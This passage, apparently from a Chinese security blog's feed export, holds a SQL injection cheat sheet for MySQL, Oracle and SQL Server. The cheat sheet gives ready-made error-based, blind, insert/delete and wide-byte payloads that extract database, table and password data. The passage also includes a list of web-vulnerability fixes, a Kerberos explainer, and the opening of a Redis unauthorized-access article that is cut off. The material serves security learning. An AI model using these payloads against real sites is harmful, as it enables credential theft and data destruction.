函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><pre><code>爆库：?id=1&#39; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +爆表：?id=1&#39; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1) -- +爆字段：?id=1&#39; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +爆数据：?id=1&#39; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></pre><p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p><pre><code>substr(string string,num start,num length);#string为字符串,start为起始位置,length为长度?id=1&#39; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</code></pre><h4 id="1-3-盲注"><a href="#1-3-盲注" class="headerlink" title="1.3 盲注"></a>1.3 盲注</h4><h4 id="1-3-1-时间盲注"><a href="#1-3-1-时间盲注" class="headerlink" title="1.3.1 时间盲注"></a>1.3.1 时间盲注</h4><p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p><p>一般时间盲注我们还需要使用条件判断函数</p><pre><code>#if（expre1，expre2，expre3）当 expre1 为 true 时，返回 expre2，false 时，返回 expre3#盲注的同时也配合着 mysql 提供的分割函substr、substring、left</code></pre><p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p><pre><code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id=1&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)--+</code></pre><h4 id="1-3-2-布尔盲注"><a href="#1-3-2-布尔盲注" class="headerlink" title="1.3.2 布尔盲注"></a><strong>1.3.2 布尔盲注</strong></h4><pre><code>?id=1&#39; and substr((select user()),1,1)=&#39;r&#39; -- +?id=1&#39; and IFNULL((substr((select user()),1,1)=&#39;r&#39;),0) -- +#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值?id=1&#39; and strcmp((substr((select user()),1,1)=&#39;r&#39;),1) -- +#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</code></pre><h3 id="1-4-insert-delete-update"><a href="#1-4-insert-delete-update" class="headerlink" title="1.4 insert,delete,update"></a>1.4 insert,delete,update</h3><p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p><h4 id="1-4-1-报错"><a href="#1-4-1-报错" class="headerlink" title="1.4.1 报错"></a>1.4.1 报错</h4><pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from admin;+------+-----------------------------------------------+----------+| id   | username                                      | password |+------+-----------------------------------------------+----------+|    1 | admin                                         | admin    ||    1 | and 1=1                                       | admin    ||    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |+------+-----------------------------------------------+----------+3 rows in set (0.00 sec)mysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为falsemysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;</code></pre><h4 id="1-4-2-盲注"><a href="#1-4-2-盲注" class="headerlink" title="1.4.2 盲注"></a>1.4.2 盲注</h4><pre><code>#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1),&#39;1&#39;,&quot;admin&quot;);Query OK, 1 row affected (5.00 sec)mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1),&#39;1&#39;,&quot;admin&quot;);Query OK, 1 row affected (0.00 sec)#字符型注意闭合不能使用andmysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);Query OK, 1 row affected (5.01 sec)# delete 函数 or 右边一定要为 falsemysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r4&#39;),sleep(5),0);Query OK, 0 rows affected (0.00 sec)mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0);Query OK, 0 rows affected (5.00 sec)#update 更新数据内容mysql&gt; select * from admin;+------+----------+----------+| id   | username | password |+------+----------+----------+|    2 | 1        | admin    ||    2 | 1        | admin    ||    2 | 1        | admin    ||    2 | admin    | admin    |+------+----------+----------+4 rows in set (0.00 sec)mysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;Query OK, 4 rows affected (20.00 sec)Rows matched: 4  Changed: 4  Warnings: 0</code></pre><h3 id="1-5-二次注入与宽字节注入"><a href="#1-5-二次注入与宽字节注入" class="headerlink" title="1.5 二次注入与宽字节注入"></a>1.5 二次注入与宽字节注入</h3><p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p><pre><code>mysql&gt; insert into admin (id,name,pass) values (&#39;3&#39;,0x61646d696e272d2d2b,&#39;11&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from admin;+----+-----------+-------+| id | name      | pass  |+----+-----------+-------+|  1 | admin     | admin ||  2 | admin&#39;111 | 11111 ||  3 | admin&#39;--+ | 11    |+----+-----------+-------+4 rows in set (0.00 sec)</code></pre><p>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p><p>宽字节注入：针对目标做了一定的防护，单引号转变为 <code>\&#39;</code> , mysql 会将 <code>\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字，所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</p><pre><code>id=-1%df&#39; union select...#没使用宽字节%27 -&gt; %5C%27#使用宽字节%df%27 -&gt; %df%5c%27 -&gt; 運&#39;</code></pre><h2 id="0x02-Oracle-手工注入"><a href="#0x02-Oracle-手工注入" class="headerlink" title="0x02 Oracle 手工注入"></a>0x02 Oracle 手工注入</h2><h3 id="2-1-联合注入"><a href="#2-1-联合注入" class="headerlink" title="2.1 联合注入"></a>2.1 联合注入</h3><pre><code>?id=-1&#39; union select user,null from dual--?id=-1&#39; union select version,null from v$instance--?id=-1&#39; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--?id=-1&#39; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=2)--?id=-1&#39; union select username,passwd from users--?id=-1&#39; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--</code></pre><h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><pre><code>?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select user from dual))--?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#39;Oracle%))--?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=3))--?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--</code></pre><p>2.3 盲注</p><h4 id="2-3-1-布尔盲注"><a href="#2-3-1-布尔盲注" class="headerlink" title="2.3.1 布尔盲注"></a>2.3.1 布尔盲注</h4><p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p><p>该函数的含义如下：</p><pre><code>IF 条件=值1 THEN　　　　RETURN(返回值1)ELSIF 条件=值2 THEN　　　　RETURN(返回值2)　　　　......ELSIF 条件=值n THEN　　　　RETURN(返回值n)ELSE　　　　    RETURN(缺省值)END IF</code></pre><pre><code>?id=1&#39; and 1=(select decode(user,&#39;SYSTEM&#39;,1,0,0) from dual)--?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,1,0,0) from dual)--?id=1&#39; and ascii(substr(user,1,1))&gt; 64--  #二分法</code></pre><p><strong>2.3.2 时间盲注</strong></p><p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p><pre><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--</code></pre><h2 id="0x03-SQL-server-手工注入"><a href="#0x03-SQL-server-手工注入" class="headerlink" title="0x03 SQL server 手工注入"></a>0x03 SQL server 手工注入</h2><h3 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h3><pre><code>?id=-1&#39; union select null,null--?id=-1&#39; union select @@servername, @@version--?id=-1&#39; union select db_name(),suser_sname()--?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--?id--1&#39; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--?id=-1&#39; union select (select top 1 column name from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;users&#39;)),null---?id=-1&#39; union select (select top 1 username from users where username not in (select top 3 username from users)),null--</code></pre><h3 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h3><pre><code>?id=1&#39; and 1=(select 1/@@servername)--?id=1&#39; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</code></pre><h3 id="3-3-盲注"><a href="#3-3-盲注" class="headerlink" title="3.3 盲注"></a>3.3 盲注</h3><h4 id="3-3-1-布尔盲注"><a href="#3-3-1-布尔盲注" class="headerlink" title="3.3.1 布尔盲注"></a>3.3.1 布尔盲注</h4><pre><code>?id=1&#39; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</code></pre><h4 id="3-3-2-时间盲注"><a href="#3-3-2-时间盲注" class="headerlink" title="3.3.2 时间盲注"></a>3.3.2 时间盲注</h4><pre><code>?id= 1&#39;;if(2&gt;1) waitfor delay &#39;0:0:5&#39;--?id= 1&#39;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) waitfor delay &#39;0:0:2&#39;--</code></pre><blockquote><p><strong>原文链接：乌云安全</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复方式总结</title>
      <link href="/2020/07/29/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2020/07/29/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="未使用https安全传输"><a href="#未使用https安全传输" class="headerlink" title="未使用https安全传输:"></a>未使用https安全传输:</h2><p>以HTTPS代替HTTP协议，建议启用WEB服务器的HTTPS功能，在原有HTTP登陆界面上设置自动转向以HTTPS协议访问系统登录页面。<br>另外，建议在页面认证信息传输之前先对认证信息实现加密，不要使用base64/MD5/SHA1等过于简单的加密算法，建议使用AES或更高强度的算法实现加密</p><h2 id="账户可枚举"><a href="#账户可枚举" class="headerlink" title="账户可枚举"></a>账户可枚举</h2><p>1.增加验证机制，如验证码<br>2.添加token<br>3.统一身份验证失败时的响应，用户名或密码错误</p><h2 id="登录处无验证码"><a href="#登录处无验证码" class="headerlink" title="登录处无验证码"></a>登录处无验证码</h2><p>1、增强验证码机制，为防止验证码被破解，可以适当增加验证码生成的强度，例如中文图形验证码。<br>2、用户名或密码输入错误均提示“用户名或密码错误”，防止黑客获取到注册用户信息。<br>3、限制用户登录失败次数。<br>4、限制一定时间内IP登录失败次数。<br>5、使用双因子验证策略</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>1、输入验证：某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则。</p><p>2、输出编码：数据输出前，确保用户提交的数据已被正确进行entity编码，建议对所有字符进行编码而不仅局限于某个子集。</p><p>3、明确指定输出的编码方式：不要允许攻击者为你的用户选择编码方式(如ISO 8859-1或 UTF 8)。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>检查http头的refer信息；</p><p>使用一次性令牌，对于 Get 请求，在 URL 里面加入一个令牌，对于 Post 请求，在隐藏域中加入一个令牌。建议使用Session信息做Hash，用得出的哈希值来做 CSRF 的令牌</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>描述：</p><p>文件上传漏洞，直面意思可以利用WEB上传一些特定的文件。一般情况下文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。文件上传本身是web中最为常见的一种功能需求，关键是文件上传之后服务器端的处理、解释文件的过程是否安全。一般的情况有：</p><p>-1. 上传文件WEB脚本语言，服务器的WEB容器解释并执行了用户上传的脚本，导致代码执行；</p><p>-2. 上传文件FLASH策略文件crossdomain.xml，以此来控制Flash在该域下的行为；</p><p>-3. 上传文件是病毒、木马文件，攻击者用以诱骗用户或管理员下载执行；</p><p>-4. 上传文件是钓鱼图片或为包含了脚本的图片，某些浏览器会作为脚本执行，实施钓鱼或欺诈</p><p>修复建议：</p><p>针对文件上传漏洞的特点和必须具备的三个条件，我们阻断任何一个条件就可以达到组织文件上传攻击的目的：</p><p>1、最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性；</p><p>2、文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传）；此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码；</p><p>3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件；</p><p>4、单独设置文件服务器的域名；</p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>1、前后端同时对用户输入信息进行校验，双重验证机制<br>2、执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限<br>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。<br>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。<br>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理<br>6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p><h2 id="验证码方面"><a href="#验证码方面" class="headerlink" title="验证码方面"></a>验证码方面</h2><p>1.验证码只能用一次，用完立即过期！不能再次使用,实现一次一码。<br>2.验证码不要太弱。使用扭曲、变形、干扰线条、干扰背景色、变换字体等。<br>3.大网站最好统一安全验证码，各处使用同一个验证码接口。<br>4.增加图形验证码的复杂度，设置图形验证码最少为6位，且内容设为字母+数字或者使用更复杂的人机验证码。<br>5.在后端设置每位用户每天只能输错5次的判断，输错五次后则需要手机验证码去验证登录。<br>6.限制每个IP输错密码次数的上限，若一个IP输错次数达到这个上限值后，则禁止此IP访问</p><h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h2><ol><li>一次性填写校验信息（原始密码、新密码等）后再提交修改密码请求。</li><li>对客户端提交的修改密码请求，应对请求的用户身份与当前登录的用户身份进行校验，判断是否有权修改用户的密码并对原始密码是否正确也进行判断。</li><li>不应将用于接收验证信息的手机、邮箱等信息全部明文传到客户端，应对手机、邮箱等信息进行屏蔽处理，或不将此类信息返回到客户端。</li><li>对原始密码进行了验证的情况下，限制输入原始密码的错误次数，防止攻击者暴力破解原始密码。</li><li>重置密码链接中的关键信息应随机化，不可预测（例如token机制），且禁止将关键信息返回到客户端。</li></ol><h2 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h2><p>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p><h2 id="未设置HttpOnly"><a href="#未设置HttpOnly" class="headerlink" title="未设置HttpOnly"></a>未设置HttpOnly</h2><p>描述：</p><p>cookie的属性设置不当可能会造成系统用户安全隐患，Cookie信息泄露是Cookie http only配置缺陷引起的，在设置Cookie时，可以设置的一个属性，如果Cookie没有设置这个属性，该Cookie值可以被页面脚本读取。</p><p>修复建议：</p><p>建议如果网站基于cookie而非服务器端的验证，请最好加上HttpOnly，当然，目前这个属性还不属于任何一个标准，也不是所有的浏览器支持，建议设置cookie的代码： </p><p>response.setHeader(“SET-COOKIE”, </p><p>“user=” + request.getParameter(“cookie”) + “; HttpOnly”);</p><p>本段代码设置了http only属性，攻击者无法获取用户Cookie信息。</p><h2 id="未设置内容安全策略"><a href="#未设置内容安全策略" class="headerlink" title="未设置内容安全策略"></a>未设置内容安全策略</h2><p>描述：</p><p>内容安全策略（CSP）有助于检测和减轻某些类型的攻击，包括跨站点脚本（XSS）和数据注入攻击,内容安全策略（CSP）可以通过添加内容安全策略头来实现。要实现CSP，应该为站点使用的所有类型的资源定义允许的来源列表。</p><p>修复建议：</p><p>在web应用程序中实现内容安全策略（CSP）。配置内容安全策略包括将内容安全策略HTTP标头添加到网页，并为其指定值以控制允许用户代理为该页加载的资源，具体实现有两种方法：</p><p>\1.   使用meta标签：</p><meta http-equiv="Content-Security-Policy" content="default-src 'self' *.xx.com *.xx.cn 'unsafe-inline' 'unsafe-eval';"><p>这种方式最简单，但是也有些缺陷，每个页面都需要添加，而且不能对限制的域名进行上报</p><p>\2.   在服务端配置CSP：</p><p>（1）Apache：</p><p>Add the following to your httpd.conf in your VirtualHost or in an .htaccess file:</p><p>Header set Content-Security-Policy “default-src ‘self’;”</p><p>（2）Nginx：</p><p>In your server {} block add:</p><p>add_header Content-Security-Policy “default-src ‘self’;”;</p><p>在服务端配置所有的页面都可以不需要改了，而且还支持上报。</p><p>如果meta、响应头里都指定了Content-Security-Policy，则会优先使用响应头里的Content-Security-Policy。</p><h2 id="脆弱加密方式"><a href="#脆弱加密方式" class="headerlink" title="脆弱加密方式"></a>脆弱加密方式</h2><p>描述：</p><p>应用系统对用户名和密码数据的加密算法为MD5加密，通过简单的编码转换工具即可将密文解密。</p><p>应用系统对敏感信息加密处理强度不够，这可能导致用户信息泄漏等风险</p><p>修复建议：</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 修复建议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos 协议</title>
      <link href="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>原文链接：</strong><a href="https://wiki.0-sec.org/#/md">https://wiki.0-sec.org/#/md</a></p></blockquote><h2 id="Kerberos-协议介绍"><a href="#Kerberos-协议介绍" class="headerlink" title="Kerberos 协议介绍"></a>Kerberos 协议介绍</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos协议框架"><a href="#Kerberos协议框架" class="headerlink" title="Kerberos协议框架"></a>Kerberos协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数<br>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/1.png" alt="image"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，<br>验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server<br>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/2.png" alt="image"></p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/3.png" alt="image"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/4.png" alt="image"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/5.png" alt="image"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/6.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问总结</title>
      <link href="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>redis的未授权漏洞一直都是一个很火的漏洞，最近看许多前辈的文章后根据自己的实践再次总结一下，为日后复习方便回顾。</p><h1 id="Redis基础"><a href="#Redis基础" class="headerlink" title="Redis基础"></a>Redis基础</h1><h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><pre><code>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内   存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</code></pre><h2 id="Redis常用命令："><a href="#Redis常用命令：" class="headerlink" title="Redis常用命令："></a>Redis常用命令：</h2><pre><code>     set 